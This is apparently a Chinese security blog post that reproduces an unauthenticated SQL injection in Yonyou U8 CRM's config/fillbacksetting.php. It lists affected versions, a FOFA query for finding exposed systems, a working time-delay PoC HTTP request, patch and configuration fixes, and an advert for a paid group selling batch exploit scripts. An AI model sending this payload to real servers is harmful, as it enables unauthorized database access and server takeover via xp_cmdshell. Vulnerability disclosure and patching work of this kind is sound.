#  「漏洞复现」用友U8 CRM config/fillbacksetting.php SQL注入漏洞   
冷漠安全  冷漠安全   2024-10-06 10:42  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
**0x01 免责声明**  
  
**免责声明**  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
**产品介绍**  
  
用友U8 CRM客户关系管理系统是一款专业的企业级CRM软件，旨在帮助企业高效管理客户关系、提升销售业绩和提供优质的客户服务。  
  
0x03  
  
**漏洞威胁**  
  
用友 U8 CRM客户关系管理系统 config/fillbacksetting.php 文件存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。  
  
影响范围：  
  
V18, V16.5, V16.1, V16.0, V15.1, V13  
  
0x04  
  
**漏洞环境**  
  
FOFA:  
```
title="用友U8CRM"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rZbPuRXOXvogJBfqJEVz5EmMvp2Qs6uHgJvbZcl4vPicyA1qD4Vr07lx2EYvLEgqdWXn80ibf6hfBA/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
**漏洞复现**  
  
PoC  
```
GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=bgsesstimeout-;
Connection: close
```  
  
延时  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rZbPuRXOXvogJBfqJEVz5EuFahuYkn4mNQ7Mdoib8SMnibq2aRAuDicjdSxDbYJuHJHg6HS4LNLRqIw/640?wx_fmt=png&from=appmsg "")  
  
  
0x06  
  
**批量脚本验证**  
  
Nuclei验证脚本已发布  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rZbPuRXOXvogJBfqJEVz5EhZXUDObI3pxDuZ1Q1Dl3L3QiaIer0PUEeYbKfHDgNYK0rtmtfHicc2eA/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
**修复建议**  
  
第一步：在配置文件尾部追加如下段落即可  
  
配置文件：U8SOFT\turbocrm70\apache\conf\httpd.conf，  
  
在末尾添加一个配置：  
  
Require local  
  
其中，需要将中的u8安装路径修改为正确的安装路径  
  
第二步：U8CRM存在SQL注入漏洞导致RCE的补丁20240925.zip  
  
将解压文件中的U8SOFT目录覆盖产品安装目录。  
  
第三步：修改完之后重启Apache4TurboCRM70服务  
  
另：  
  
U8V16.1或更低版本，U8CRM功能会在产品安装时全选模块带入。如果没有使用U8CRM模块功能，需要禁用U8CRM服务。即在U8应用服务管理器中停止并禁用Apache4TurboCRM70, TurboCRM70和memcached Server。  
  
U8从v16.5开始，CRM不再作为主安装盘的一部分，而是作为独立安装盘发布。在主安装盘选择全部模块不会安装CRM模块。如果没有从单独的安装盘安装U8CRM，不会受到本漏洞影响，无需进行任何处理。  
  
补丁链接：https://security.yonyou.com/#/noticeInfo?id=618  
  
0x08  
  
**加入我们**  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全交个朋友，限时优惠券：加入立减25星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0rZbPuRXOXvogJBfqJEVz5EpOr7GkCBXaqoouzk9qvYubmrhRHK5aaGNtuGOg9ibHicUclUiccSzkl6w/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0rZbPuRXOXvogJBfqJEVz5EDQw0MK8sstCDfO52HgwahtslPGXhhC7CnUxcp7HwuL8mSicpeTdk6TQ/640?wx_fmt=gif&from=appmsg "")  
  
  
